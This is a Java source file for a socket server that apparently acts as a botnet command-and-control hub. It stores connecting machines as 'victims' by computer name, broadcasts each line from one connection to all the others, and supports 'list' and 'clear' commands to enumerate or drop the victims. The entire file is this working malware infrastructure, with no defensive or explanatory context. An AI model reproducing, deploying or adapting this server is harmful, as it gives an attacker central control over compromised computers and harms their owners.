import java.io.*; 
import java.net.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map; 

// Server class 
class Server { 
	public static void main(String[] args) 
	{ 
		ServerSocket server = null; 
		Map<String, Socket> victims = new HashMap<String, Socket>();
		try { 

			// server is listening on port 1234 
			server = new ServerSocket(1234); 
			server.setReuseAddress(true); 

			// running infinite loop for getting 
			// client request 
			while (true) { 

				// socket object to receive incoming client 
				// requests 
				Socket client = server.accept(); 
                PrintWriter out = null; 
				BufferedReader in = null;
				// get the outputstream of client 
				out = new PrintWriter( 
					client.getOutputStream(), true); 
				// get the inputstream of client 
				in = new BufferedReader( 
					new InputStreamReader( 
						client.getInputStream())); 
				// Displaying that new client is connected 
				String computerName = in.readLine();
				victims.put(computerName, client);
				System.out.println("New victim connected "
								+ client.getInetAddress() 
										.getHostAddress() +" "+ computerName); 

				// create a new thread object 
				ClientHandler clientSock 
					= new ClientHandler(client,victims,out,in,computerName); 

				// This thread will handle the client 
				// separately 
				new Thread(clientSock).start(); 
			} 
		} 
		catch (IOException e) { 
			e.printStackTrace(); 
		} 
		finally { 
			if (server != null) { 
				try { 
					server.close(); 
				} 
				catch (IOException e) { 
					e.printStackTrace(); 
				}
			} 
		} 
	} 

	// ClientHandler class 
	private static class ClientHandler implements Runnable { 
		private final Socket clientSocket;
        Map<String, Socket> victims;
		PrintWriter out = null; 
		BufferedReader in = null;
		String computerName;
		
		public ClientHandler(Socket clientSocket, Map<String, Socket> victims, PrintWriter out, BufferedReader in,String computerName) {
			this.computerName = computerName;
			this.clientSocket = clientSocket;
			this.victims = victims;
			this.out = out;
			this.in = in;
		}


		public void run() 
		{ 
			
			try { 
				String line; 
				while ((line = in.readLine()) != null) {

					if(line.equals("clear")){
						for(Map.Entry<String, Socket> entry : victims.entrySet()) {
							Socket socket = entry.getValue();
							socket.close();
						}
						victims.clear();
					}
					else if(line.equals("list")){
						String deviceList = "";
						for(Map.Entry<String, Socket> entry : victims.entrySet()) {
							String key = entry.getKey();
							deviceList += key+" ---- "; 
						}
						out.println(deviceList);
					}
					else{
						for(Map.Entry<String, Socket> entry : victims.entrySet()) {
							Socket socket = entry.getValue();
							if(socket != this.clientSocket){
								PrintWriter msgout = new PrintWriter( socket.getOutputStream(), true); 
								msgout.println(line);
							}
						}
						
					}
                    
				} 
			} 
			catch (IOException e) { 
				e.printStackTrace(); 
			} 
			finally { 
				try { 
					if (out != null) { 
						out.close(); 
					} 
					if (in != null) { 
						in.close(); 
						clientSocket.close(); 
					} 
				} 
				catch (IOException e) { 
					e.printStackTrace(); 
				} 
			} 
		} 
	} 
}
